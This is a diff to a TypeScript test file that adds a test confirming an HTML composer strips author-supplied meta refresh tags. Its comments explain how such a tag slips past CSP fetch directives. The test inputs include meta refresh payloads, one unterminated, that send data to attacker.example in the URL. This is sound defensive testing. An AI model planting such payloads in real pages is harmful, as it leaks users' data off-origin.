@@ -189,6 +189,28 @@ describe("composeHtmlDocument keeps author script and closes the policy", () => 
     expect(composeHtmlDocument("<p>ok</p>", "")).toContain("<p>ok</p>");
   });
 
+  it("defuses author <meta>, which NAVIGATES the document past every fetch directive", () => {
+    // `<meta http-equiv="refresh" content="0;url=…">` is a navigation, and no CSP
+    // fetch directive covers one. The export and fit-width measuring frames load
+    // the composed document with no enclosing `frame-src` to catch it, so this is
+    // the only thing standing between author markup and an off-origin navigation
+    // carrying data in the URL. DOMPurify used to drop <meta>; it no longer runs.
+    const authorMetas = (author: string) => {
+      const doc = new DOMParser().parseFromString(composeHtmlDocument(author, ""), "text/html");
+      // OUR injected CSP/charset/viewport metas live in <head> and must survive;
+      // only what the author supplied, which lands in <body>, is defused.
+      return doc.body.querySelectorAll("meta").length;
+    };
+
+    expect(authorMetas('<meta http-equiv="refresh" content="0;url=https://attacker.example/?d=1"><p>ok</p>')).toBe(0);
+    // Unterminated, the same bypass shape the <link> defusing is written against.
+    expect(authorMetas('<p>ok</p><meta http-equiv=refresh content="0;url=https://attacker.example" ')).toBe(0);
+
+    // Our own head metas are untouched — the policy still has to reach the parser.
+    expect(composeHtmlDocument("<p>ok</p>", "")).toContain("Content-Security-Policy");
+    expect(composeHtmlDocument("<p>ok</p>", "")).toContain("<p>ok</p>");
+  });
+
   it("leaves markup that merely DISPLAYS a <link> tag as text alone", () => {
     const out = composeHtmlDocument("<pre>&lt;link rel=preconnect&gt;</pre>", "");
     expect(out).toContain("&lt;link rel=preconnect&gt;");
